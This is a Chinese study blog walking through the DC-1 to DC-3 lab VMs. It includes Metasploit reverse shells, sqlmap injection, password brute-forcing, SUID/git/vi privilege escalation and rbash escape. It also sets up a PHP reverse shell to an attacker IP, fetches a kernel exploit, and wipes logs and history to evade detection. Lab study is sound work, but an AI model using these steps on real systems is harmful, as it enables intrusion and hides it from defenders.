---
title: 渗透学习-DC靶场
date: 2026-05-12 21:04:11
tags:
- ISW
- 渗透
- nmap
- wpscan
- rbash
- 提权
- cewl
category:
- 学习笔记
---

# ISW学习

# DC-1靶机

## nmap探测主机存活80/sP探测

#### 端口扫描

```
nmap 192.168.234.0/24 -p 80 # 这里使用80端口来找存活的web主机也可以使用其他方式
```

| `nmap`             | 网络扫描工具 | Network Mapper           |
| ------------------ | ------------ | ------------------------ |
| `192.168.234.0/24` | 目标网段     | 扫描整个 C 段（256个IP） |
| `-p 80`            | 端口指定     | 只扫描80端口             |

![](C:/Users/Administrator/myBlog/source/image/ISW-1.png)

可以看到存活主机5台以及端口状态

---

#### 三种端口状态

| 状态         | 含义       | 说明                    |
| ------------ | ---------- | ----------------------- |
| **open**     | 端口开放   | ✅ 有服务监听，可以访问  |
| **closed**   | 端口关闭   | ❌ 主机在线但端口未开放  |
| **filtered** | 端口被过滤 | 🚫 防火墙/ACL 阻止了访问 |

这里192.168.234.130的80端口是开放的有web服务（http）

---

#### 主机发现

```
nmap -sP 192.168.234.0/24 

# -sP这个选项是用来指定一个主机发现方法。
```

靶机端口扫描，开放了22、80、111、34471端口

![](C:/Users/Administrator/myBlog/source/image/ISW-2.png)

---

#### **和指定端口扫描的区别：**

**`-sP`**：只找**哪些主机在线**（不扫描端口）

**`-p 80`**：找**哪些主机的80端口开放**（有Web服务）

---

访问http服务的80端口，进入到web界面，有一个登录

sql注入万能密码，也没有sql语句错误的提示，这里就直接绕过sql注入

注册一个用户试试，他还要发送邮件，并没有让我们填写密码

需要批准之后才能注册用户

```
dirb http://192.168.234.130/
```

由于没有登录，dirb不能指定cookie扫描，扫到一个robots.txt和web.config没有什么作用

访问robots.txt和web.config也没什么有用的

还有个xmlrpc.php，应该是个api接口没什么用

---

## **漏洞探测**

使用`whatweb`（kali自带）指纹识别，找到目标cms的版本和其他信息

```
whatweb -v 192.168.234.130
```

![](C:/Users/Administrator/myBlog/source/image/ISW-3.png)

---

## msf漏洞利用

msf漏洞利用，直接搜索`Drupal`这些模块

```
msfconsole
search Drupal
```

![](C:/Users/Administrator/myBlog/source/image/ISW-4.png)

使用第一个模块试试，显示这个模块的所有payload，都是反弹和正向连接的，没有我们需要的

```
show payloads
```

我们使用第二个模块试试

```
use unix/webapp/drupal_drupalgeddon2
# 或者
use 1
# 然后
show payloads # 显示该模块下的所有payload
```

发现这些东西，和php有关，而且能反弹到我们meterpreter后渗透模块中

![](C:/Users/Administrator/myBlog/source/image/ISW-5.png)

设置payload为tcp反弹shell

```
set payload payload/php/meterpreter/reverse_tcp
```

当然也可以使用tcp正向连接

```
set payload payload/php/meterpreter/bind_tcp
```

---

**正向连接和反向连接区别：**

```
正向连接：在msf中通常是指，bind_tcp，定义--攻击机主动发起连接请求，连接到目标靶机特定的一个端口，目标机器也需要开启一个监听端口，比如tcp监听

反向连接：在msf中通常是指，reverse_tcp，定义--更常用，通过设置reverse_tcp攻击载荷可以轻松实现反弹，监听只需要在本机开启监听端口。

主要区别就是公网和局域网的不同利用，正向连接通常攻击机用在局域网中不能访问 外网靶机，反向连接需要两个机器都需要能互相ping
```

这里就使用反向连接来测试

```
set payload payload/php/meterpreter/reverse_tcp

set RHOSTS 192.168.234.130

run
```

成功反弹shell

---

## **后渗透**

**查看系统信息**

```
sysinfo
```

**获取shell**

```
shell
```

上面终端显示的样子不好看，使用python调用系统终端

```
python -c "import pty;pty.spawn('/bin/bash')"
```

这样子就好看多了

```
ls
```

找到flag1.txt

尝试读取

```
www-data@DC-1:/var/www$ cat flag1.txt
cat flag1.txt
Every good CMS needs a config file - and so do you.
```

他说下一步要找一个cms的配置文件，一般配置文件都是settings.xxx，这里我们从当前目录模糊查询一下

```
find . -name 'set*'
```

![](C:/Users/Administrator/myBlog/source/image/ISW-6.png)

又给了一个提示

```
What can you do with these credentials?

你能用这些凭证做什么？
```

```
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

很明显可以去连接本地数据库

```
mysql -udbuser -pR0ck3t
```

![](C:/Users/Administrator/myBlog/source/image/ISW-7.png)

查看所有数据库

```
show databases;
```

切换到这个站点的数据库，并查看有什么表

```
use drupaldb
show tables;
```

找到有一个users表

里面包含用户名/密码信息

```
select * from users;
```

这样子不好看，那么我们就加一个\G

```
select * from users\G;
```

![](C:/Users/Administrator/myBlog/source/image/ISW-8.png)

不知道是什么加密，那么我们只能去找这个hash规则的文件了

当前站点目录查找这个文件，并发现有一个**password-hash.sh**文件

```
find . -name '*hash*'
```

执行这个文件

```
./scripts/password-hash.sh
```

```
www-data@DC-1:/var/www$ ./scripts/password-hash.sh
./scripts/password-hash.sh

Generate Drupal password hashes from the shell.

Usage:        password-hash.sh [OPTIONS] "<plan-text password>"
Example:      password-hash.sh "mynewpassword"

All arguments are long options.

  --help      Print this page.

  --root <path>

              Set the working directory for the script to the specified path.
              To execute this script this has to be the root directory of your
              Drupal installation, e.g. /home/www/foo/drupal (assuming Drupal
              running on Unix). Use surrounding quotation marks on Windows.

  "<password1>" ["<password2>" ["<password3>" ...]]
			
              One or more plan-text passwords enclosed by double quotes. The
              output hash may be manually entered into the {users}.pass field to
              change a password via SQL to a known value.

To run this script without the --root argument invoke it from the root directory
of your Drupal installation as

  ./scripts/password-hash.sh

```

```
              One or more plan-text passwords enclosed by double quotes. The
              output hash may be manually entered into the {users}.pass field to
              change a password via SQL to a known value.
              
一个或多个用双引号括起来的明文密码。
输出的哈希值可以手动输入到 {users}.pass 字段中，通过 SQL 将密码更改为已知值。
```

根据它的提示，传一个密码给他，执行一下生成了一个密码为123456的hash值

```
./scripts/password-hash.sh 123456
```

```
password: 123456                hash: $S$Du9JDa8zS65YMohxs1NXrgC7gINDwMjEhE0R3UfLKm3X3ZoyloHk
```

感觉和数据库中的密码很像

把他复制下来

进入mysql

修改密码

```
use drupaldb

update users set pass='$S$Du9JDa8zS65YMohxs1NXrgC7gINDwMjEhE0R3UfLKm3X3ZoyloHk' where name='admin';
```

登录即可

这里我们就在content里找到了flag3

![](C:/Users/Administrator/myBlog/source/image/ISW-9.png)

点进去之后发现提示

![](C:/Users/Administrator/myBlog/source/image/ISW-10.png)

```
特殊的 PERMS 权限将帮助您 FIND 到 passwd 文件 - 但您需要使用 -exec 执行该命令，来弄清楚如何获取 shadow 文件中的内容。
```

提示我们去passwd，找到flag4

```
www-data@DC-1:/var/www$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

切换flag4用户下的目录

```
www-data@DC-1:/var/www$ cd /home/flag4
cd /home/flag4
www-data@DC-1:/home/flag4$ ls
ls
flag4.txt
www-data@DC-1:/home/flag4$ cat flag4.txt
cat flag4.txt
Can you use this same method to find or access the flag in root?
```

大致意思就是root目录下的flag，所以这里需要我们提权

查看这个文件的权限，尝试追加用户提权

```
追加用户提权
例如：
echo "hacker:password_hash:0:0:root:/root:/bin/bash" >> /etc/passwd


查看/etc/passwd文件权限
ls -l /etc/passwd
```

发现只能root读写

看看suid提权

```
find / -perm -u=s -type f  2>/dev/null
# `1>/dev/null`用于丢弃正常输出，而`2>/dev/null`用于丢弃错误输出。
```

```
www-data@DC-1:/home/flag4$ find / -perm -u=s -type f  2>/dev/null                                                                                           
find / -perm -u=s -type f  2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
```

有`/usr/bin/find`，使用find提权

```
find / -exec "/bin/bash" -p \;
```

提权成功，找到最后一个flag

```
cd /root

ls

cat thefinalflag.txt
```

---

## 痕迹清除

观察一下我们刚刚使用过的操作，登录数据库（数据库日志），web请求（阿帕奇日志），msf漏洞利用（kaliweb请求），命令使用（history）

### **1、中间件日志清除**

对于web请求（阿帕奇日志），msf漏洞利用（kaliweb请求）这两个我们直接清除指定ip的行即可，日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。

```
find / -name 'access*'
```

apache日志文件

```
/var/log/apache2/access.log
```

查看都有一些什么内容

```
cat /var/log/apache2/access.log
```

筛选自己的主机（192.168.234.1）和攻击机器（192.168.234.128）的请求记录

```
sed -i '/192.168.234.1/d' /var/log/apache2/access.log
```

这条命令会直接在原文件中删除所有包含`192.168.234.1`的行。`-i`选项表示直接修改文件。/d这里表示清除209段下的所有ip地址日志

可以看到连同kali（192.168.209.151）的日志一起清除成功了

同理正常请求日志清除了，**错误请求日志**也要删除吧

```
find / -name 'error*'
```

```
cat /var/log/apache2/error.log
```

一大堆kali攻击日志

同理直接使用sed更改

```
 sed -i '/192.168.234.1/d' /var/log/apache2/error.log
```

清除成功！

### 2、密码还原

对于渗透测试中，这里有一个小细节，我们把密码改了，要做到无痕，还得把密码改回去

登录数据库

```
mysql -udbuser -pR0ck3t
```

```
update users set pass="$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR" where name="admin";
```

### **3、清除数据库日志**

没有权限

```
show binary logs;
```

查看日志状态

```
show variables like '%log%';
```

```
show variables like '%log%';
mysql> show variables like '%log%';
+-----------------------------------------+------------------------------+
| Variable_name                           | Value                        |
+-----------------------------------------+------------------------------+
| back_log                                | 50                           |
| binlog_cache_size                       | 32768                        |
| binlog_direct_non_transactional_updates | OFF                          |
| binlog_format                           | STATEMENT                    |
| binlog_stmt_cache_size                  | 32768                        |
| expire_logs_days                        | 10                           |
| general_log                             | OFF                          |
| general_log_file                        | /var/lib/mysql/DC-1.log      |
| innodb_flush_log_at_trx_commit          | 1                            |
| innodb_locks_unsafe_for_binlog          | OFF                          |
| innodb_log_buffer_size                  | 8388608                      |
| innodb_log_file_size                    | 5242880                      |
| innodb_log_files_in_group               | 2                            |
| innodb_log_group_home_dir               | ./                           |
| innodb_mirrored_log_groups              | 1                            |
| log                                     | OFF                          |
| log_bin                                 | OFF                          |
| log_bin_trust_function_creators         | OFF                          |
| log_error                               |                              |
| log_output                              | FILE                         |
| log_queries_not_using_indexes           | OFF                          |
| log_slave_updates                       | OFF                          |
| log_slow_queries                        | OFF                          |
| log_warnings                            | 1                            |
| max_binlog_cache_size                   | 18446744073709547520         |
| max_binlog_size                         | 104857600                    |
| max_binlog_stmt_cache_size              | 18446744073709547520         |
| max_relay_log_size                      | 0                            |
| relay_log                               |                              |
| relay_log_index                         |                              |
| relay_log_info_file                     | relay-log.info               |
| relay_log_purge                         | ON                           |
| relay_log_recovery                      | OFF                          |
| relay_log_space_limit                   | 0                            |
| slow_query_log                          | OFF                          |
| slow_query_log_file                     | /var/lib/mysql/DC-1-slow.log |
| sql_log_bin                             | ON                           |
| sql_log_off                             | OFF                          |
| sync_binlog                             | 0                            |
| sync_relay_log                          | 0                            |
| sync_relay_log_info                     | 0                            |
+-----------------------------------------+------------------------------+
```

general_log是一个记录数据库服务器所接收到的每一条SQL语句的日志文件。

当general_log设置为ON时，MySQL会记录所有客户端发送给服务器的SQL语句到general_log_file指定的文件中。

当general_log设置为OFF时，MySQL不会记录这些SQL语句，从而节省磁盘空间和提高性能。

慢查询日志slow_query_log看图也是关闭的

当 slow_query_log 设置为 ON 时，MySQL 会将执行时间较长的查询记录到慢查询日志文件中，通常这个文件位于数据目录中，文件名可能是 hostname-slow.log。

当 slow_query_log 设置为 OFF 时，MySQL 不会记录慢查询。

```
| general_log                             | OFF                          |
| general_log_file                        | /var/lib/mysql/DC-1.log   


| slow_query_log                          | OFF                          |
| slow_query_log_file                     | /var/lib/mysql/DC-1-slow.log |
```

找到这两个日志文件路径，看看有没有，很好没有，这一步跳过

```
cat /var/lib/mysql/DC-1.log   
cat /var/lib/mysql/DC-1-slow.log
```

---

### 4、清除命令历史

查看自己曾经输入过的命令

```
history
```

```
history -c 
# 清除命令历史
```

### **5、登录日志**

这里我们使用的是反弹shell，实际上并没有登录，不会增加一条标准的ssh登录日志，这里跳过。

### **6、nmap扫描日志**

nmap扫描时，如果你指定了输出文件（例如使用`-oN`选项），确保删除这些文件。

清除临时文件，如`/tmp`，查看是否有nmap相关的临时文件，并将其删除。

```
cd /tmp

find . -name 'nmap'

find . -name '*nmap*'

history -c
```

### 扩展

隐身登录系统，不会被w、who、last等指令检测到。

```
ssh -T root@192.168.0.1 /bin/bash -i
```

不记录ssh公钥在本地.ssh目录中

```
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
```

---

# DC-2靶机

## nmap主机发现

```
nmap -sP 192.168.234.0/24
```

```
nmap -sP 192.168.234.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-26 07:23 EDT
Nmap scan report for 192.168.234.1
Host is up (0.00037s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.234.2
Host is up (0.00023s latency).
MAC Address: 00:50:56:EB:2D:43 (VMware)
Nmap scan report for 192.168.234.131
Host is up (0.00051s latency).
MAC Address: 00:0C:29:B2:76:DD (VMware)
Nmap scan report for 192.168.234.254
Host is up (0.00074s latency).
MAC Address: 00:50:56:F1:D1:FF (VMware)
Nmap scan report for 192.168.234.128
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.24 seconds

```

这里扫到靶机

```
192.168.234.131
```

---

## 全端口扫描

对扫描出的靶机进行全端口扫描

```
nmap -sS -p- 192.168.234.131
```

![](C:/Users/Administrator/myBlog/source/image/ISW-11.png)

看到80端口有http服务，然后尝试去访问，但是发现访问这个ip的时候，自动跳转到了`http://dc-2`

```
192.168.234.131/dc-2/
```

但是加上这个ip之后404

index.php可以正常访问

```
http://192.168.234.131/index.php
```

![](C:/Users/Administrator/myBlog/source/image/ISW-12.png)

那么应该就是host文件问题，修改hosts `C:\Windows\System32\drivers\etc\hosts`在行尾添加这一行内容

```
192.168.234.131 dc-2
```

然后

```
# 清除 DNS 缓存（如果修改后没生效）
ipconfig /flushdns
```

现在访问 `dc-2` 就会解析到 `192.168.234.131`。

---

flag1

![](C:/Users/Administrator/myBlog/source/image/ISW-13.png)

"Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl."

大致意思就是你可能需要cewl这款工具

看目录扫描结果，这是一个`wordpress`网站，有一个后台界面`wp-admin`

sql注入万能密码

拦截登录响应

登录失败

还有一些其他的测试方法，比如xss，弱口令都不行，这里我们就要用到`cewl`这个工具了

---

## cewl

```
Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。
```

我们将扫描结果重定向到`passwd.txt`（就是保存文件或者使用`cewl`的自带的`-m`参数）

```
cewl http://dc-2/ > passwd.txt
```

![](C:/Users/Administrator/myBlog/source/image/ISW-14.png)

## wpscan

```
WPScan是一个扫描 WordPress 漏洞的黑盒子扫描器，它可以为所有 Web 开发人员扫描 WordPress 漏洞并在他们开发前找到并解决问题。
```

使用`wpscan`枚举可能的用户名

```
wpscan --url http://dc-2/ -e u
```

![](C:/Users/Administrator/myBlog/source/image/ISW-15.png)

一共扫描出来三个用户admin，jerry，tom可以使用

此时我们已经有了用户名和密码字典

## wpscan爆破账号密码

使用`wpscan`爆破账号密码，指定刚刚我们生成的用户字典`users.txt`和密码字典`passwd.txt`

```
wpscan --url http://dc-2/ -U users.txt -P passwd.txt
```

爆破成功，结果如下

```
jerry / adipiscing
tom / parturient
```

![](C:/Users/Administrator/myBlog/source/image/ISW-16.png)

然后登录成功

在旁边导航栏找到了Pages，即可得到flag2

![](C:/Users/Administrator/myBlog/source/image/ISW-17.png)

提示

```
If you can't exploit WordPress and take a shortcut, there is another way.Hope you found another entry point.

如果 WordPress 无法直接利用，可以寻找其他入口点。
```

尝试文件上传

上传一个php文件，被禁止了

只能上传图片文件，并且没有文件包含，尝试文件名后缀爆破也失败了

---

## **系统渗透**

之前我们换端口扫描的时候有一个7744端口

![](C:/Users/Administrator/myBlog/source/image/ISW-11.png)

用`ssh`默认22端口是拒绝服务的

```
ssh root@192.168.234.131
ssh: connect to host 192.168.234.131 port 22: Connection refused
```

指定一下7744端口的时候既让让我们输入密码，那这个就是`ssh`服务端口了

```
ssh root@192.168.234.131 -p 7744
```

第一个用户测试失败

```
jerry / adipiscing
```

第二个用户，登录成功

```
tom / parturient

ssh tom@192.168.234.131 -p 7744
```

## rbash

```
什么是rbash？它与一般shell的区别在于会限制一些行为，让一些命令无法执行，这里就让我的cat、clear、su等等命令进行了限制
```

发现命令被限制了'rbash'

```
tom@DC-2:~$ echo $SHELL
/bin/rbash
```

使用ls命令发现flag3.txt

尝试用cat去读取

但是显示找不到命令

![](C:/Users/Administrator/myBlog/source/image/ISW-18.png)

### 查看可用的命令

```
compgen -c
```

滑到最下面，有一个vi命令

```
vi flag3.txt
```

得到提示

```
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

flag3.txt内容：可怜的老Tom总是追着Jerry跑。也许他应该为自己造成的压力而死。

我们去/etc/passwd，看看能不能添加一个”root“用户，查看权限，发现不行，这个文件是只读的

生成md5密码

```
# 1. 生成新哈希（用 mixbp）
NEW_HASH=$(openssl passwd -1 mixbp)

# 2. 添加新用户
echo "hacker:$NEW_HASH:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd

# 3. 登录
su hacker
# 密码: mixbp
```

查看权限

```
tom@DC-2:~$ ls -l /etc/passwd                                                                               -rw-r--r-- 1 root root 1547 Mar 21  2019 /etc/passwd       
```

---

去home，cd 并不能直接使用，但是有一个 ls

```
ls /home
ls /home/jerry
```

直接找到了flag4

![](C:/Users/Administrator/myBlog/source/image/ISW-19.png)

告诉我们使用`git`离开这里，应该就是让我们用`git`提权

查看文件所属，是jerry的，这里直接跳过吧，找到就好，没什么作用了

我们看看刚刚的flag3.txt，所属用户为tom

```
tom@DC-2:~$ ls -l
total 8
-rwxr-x--- 1 tom tom   95 Mar 21  2019 flag3.txt
drwxr-x--- 3 tom tom 4096 Mar 21  2019 usr
```

那么就用它提权试试

### vi提权

```
:set shell=/bin/bash
:shell
```

![](C:/Users/Administrator/myBlog/source/image/ISW-20.png)

这里直接"提权"成功了

但是没什么作用哈，root目录也切换不了

### 查看环境变量

```
export -p


#
tom@DC-2:~$ export -p
declare -x HOME="/home/tom"
declare -x LANG="en_US.UTF-8"
declare -x LOGNAME="tom"
declare -x MAIL="/var/mail/tom"
declare -x OLDPWD
declare -x PATH="/home/tom/usr/bin"
declare -x PWD="/home/tom"
declare -x SHELL="/bin/rbash"
declare -x SHLVL="2"
declare -x SSH_CLIENT="192.168.234.128 43886 7744"
declare -x SSH_CONNECTION="192.168.234.128 43886 192.168.234.131 7744"
declare -x SSH_TTY="/dev/pts/0"
declare -x TERM="xterm-256color"
declare -x USER="tom"
declare -x VIM="/usr/share/vim"
declare -x VIMRUNTIME="/usr/share/vim/vim74"
```

### **rbash逃逸**

我们通过修改环境变量，之后使用jerry / adipiscing登录

```
# 当前处于 rbash（受限 bash）中
# rbash 禁止修改 PATH 环境变量
tom@DC-2:~$ export PATH=$PATH:/bin/
# 尝试添加 /bin 到 PATH，但被 rbash 拒绝
rbash: PATH: readonly variable

# BASH_CMDS 是一个关联数组，可以存储命令的路径
# 将 /bin/sh 的路径赋值给数组元素 a
tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a
# 执行 a，实际执行 /bin/sh，获得一个新的 shell
# 此时 shell 仍然是受限的，但可以执行 /bin/bash

# 在新 shell 中执行 /bin/bash，启动完整 bash
$ /bin/bash
# 现在获得了完整的 bash shell，不再是 rbash
tom@DC-2:~$ 

# 此时已经不在 rbash 中，PATH 不再只读
# 可以正常添加 /bin 到环境变量
tom@DC-2:~$ export PATH=$PATH:/bin/
# 现在 PATH 包含了 /bin，su 命令可用

# 使用 su 命令切换到 jerry 用户
tom@DC-2:~$ su jerry
# 输入 jerry 的密码
Password:
# 成功切换到 jerry 用户
jerry@DC-2:/home/tom$
```

此时我们是jerry权限，还是进不去root

查看当前suid可用命令/文件

```
find / -perm -u=s -type f 2>/dev/null
```

```
jerry@DC-2:/home/tom$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/at
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/sbin/exim4
/bin/umount
/bin/mount
/bin/su
```

这里有一个sudo可以用，rbash逃逸中的必要条件

### **git提权**

```
sudo git help config
!/bin/bash 或 !'sh' #完成提权 
# 或者
sudo git -p help 
!/bin/bash #输入!/bin/bash 即可打开一个用户为root的shell
```

ok完成dc-2靶机

---

# DC-3靶机

## 主机发现

```
nmap -sP 192.168.234.0/24
或者
nmap -sP 192.168.234.0-255
```

![](C:/Users/Administrator/myBlog/source/image/ISW-21.png)

---

## 端口快速扫描

```
nmap -sS 192.168.234.132 -p-
```

![](C:/Users/Administrator/myBlog/source/image/ISW-22.png)

发现有80端口服务，并快速找到编程语言为PHP语言

![](C:/Users/Administrator/myBlog/source/image/ISW-23.png)

御剑扫描

![](C:/Users/Administrator/myBlog/source/image/ISW-24.png)

---

## joomla

后台界面

![](C:/Users/Administrator/myBlog/source/image/ISW-25.png)

发现是joomla

安装 joomscan 这个工具

```
sudo apt install joomscan
```

检索这个joomla版本信息是3.7.0

```
joomscan -u 192.168.234.132
```

![](C:/Users/Administrator/myBlog/source/image/ISW-26.png)

---

## searchsploit

使用 searchsploit 来搜索漏洞信息

搜索所有 joomla 指定版本的漏洞信息，用法，中间添加一个空格就可以了。

```
searchsploit joomla
```

再精确，找到 joomla 3.7.0 版本的sql注入漏洞

```
searchsploit joomla 3.7.0
```

![](C:/Users/Administrator/myBlog/source/image/ISW-27.png)

我们可以利用`-p`选项，我们可以获得有关目标漏洞的更多信息，并将该漏洞的完整路径复制到剪切板上。

```
searchsploit 42033
searchsploit -p 42033
```

![](C:/Users/Administrator/myBlog/source/image/ISW-28.png)

我们查看这个内容

```
cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
```

![](C:/Users/Administrator/myBlog/source/image/ISW-29.png)

---

## sqlmap

复制上面的payload，并把localhost本地地址替换成靶场地址，利用sqlmap工具

```
sqlmap -u "http://192.168.234.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --current-user
```

这个时候就得到了数据库信息，并使用 `--current-user` 获取当前数据库用户，可以看到是root用户，以及看到数据库名

![](C:/Users/Administrator/myBlog/source/image/ISW-30.png)

指定数据库为当前网站的数据库，枚举数据库所有表

```
sqlmap -u "http://192.168.234.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables
```

指定表`"#__users"`，并列出所有的列名

```
sqlmap -u "http://192.168.234.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' --columns
```

查`username`和`password`两个字段

```
sqlmap -u "http://192.168.234.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T '#__users' -C username,password --dump
```

```
Database: joomladb
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |

```

---

## john哈希爆破

创建一个文件，存储好`hash`后的密文，使用  `john` 来爆破一下，提示我们使用`--show`参数，来显示所有可能的密文

```
echo "\$2y\$10\$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu" > hash
```

创建一个文件，存储好`hash`后的密文，使用  `john` 来爆破一下，提示我们使用`--show`参数，来显示所有可能的密文

```
john hash
```

```
john --show hash
```

![](C:/Users/Administrator/myBlog/source/image/ISW-31.png)

得到 admin的密码`snoopy`，登录后台

---

## 反弹shell

添加一个php脚本，用于反弹shell

![](C:/Users/Administrator/myBlog/source/image/ISW-32.png)

我们利用kali自带的webshell工具进行反弹

```
cd /usr/share/webshells/

ls

cd php

ls
```

![](C:/Users/Administrator/myBlog/source/image/ISW-33.png)

```
cat php-reverse-shell.php
```

修改一下这个文件的两个参数，然后全部复制到这个`script.php`

```
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.234.128';  // 攻击机的ip
$port = 1234;       // 攻击机nc监听的端口
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

粘贴到这个php木马中

kali开启监听

```
nc -lvvp 1234
```

默认情况下的模板位置是在 `/templates` 目录下

当前模板名称为 `beez3`

得出脚本位置

```
http://192.168.234.132/templates/beez3/script.php
```

成功上线

![](C:/Users/Administrator/myBlog/source/image/ISW-34.png)

---

## 创建**交互式shell**

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

可以看到不是root用户，是www-data用户

---

## **信息收集**

用到的命令

```
searchsploit Ubuntu 16.04
```

![](C:/Users/Administrator/myBlog/source/image/ISW-35.png)

我们需要的是提权漏洞，再添加关键字 Privilege Escalation，找到这两个

```
searchsploit Ubuntu 16.04 Privilege Escalation
```

![](C:/Users/Administrator/myBlog/source/image/ISW-36.png)

---

## **漏洞利用**

我们用第一个4.4.x的漏洞，进行尝试

```
searchsploit -p 39772
```

查看这个文件可以看到漏洞的产生原因以及利用方法。

```
Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation
      URL: https://www.exploit-db.com/exploits/39772
     Path: /usr/share/exploitdb/exploits/linux/local/39772.txt
    Codes: CVE-2016-4557, 823603
 Verified: True
File Type: C source, ASCII text
```

```
cp /usr/share/exploitdb/exploits/linux/local/39772.txt ~/Desktop
```

搜索**exp**，有一个下载链接

```
Exploit-DB Mirror: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

下载下来即可

```
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

---

## getshell

解压，并开启http请求

![](C:/Users/Administrator/myBlog/source/image/ISW-37.png)

复制这个文件的地址就好

```
http://192.168.234.128:8000/39772/exploit.tar
```

靶机下载这个文件，但是提示我们没有权限

```
wget http://192.168.234.128:8000/39772/exploit.tar

//
$ wget http://192.168.234.128:8000/39772/exploit.tar
--2026-03-30 18:03:32--  http://192.168.234.128:8000/39772/exploit.tar
Connecting to 192.168.234.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-tar]
exploit.tar: Permission denied
```

这个时候就要想到刚刚在网页上能创建php文件的目录了，查找刚刚创建的脚本

```
find / -name "script.php" 2>/dev/null

cd /var/www/html/templates/beez3
```

我们在这个文件夹下面下载，下载完成

![](C:/Users/Administrator/myBlog/source/image/ISW-38.png)

解压到这个文件夹中

```
tar -xvf exploit.tar
```

根据这个39772的txt文件提示依次执行

```
user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)
```

```
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

![](C:/Users/Administrator/myBlog/source/image/ISW-39.png)

提权成功

```
whoami

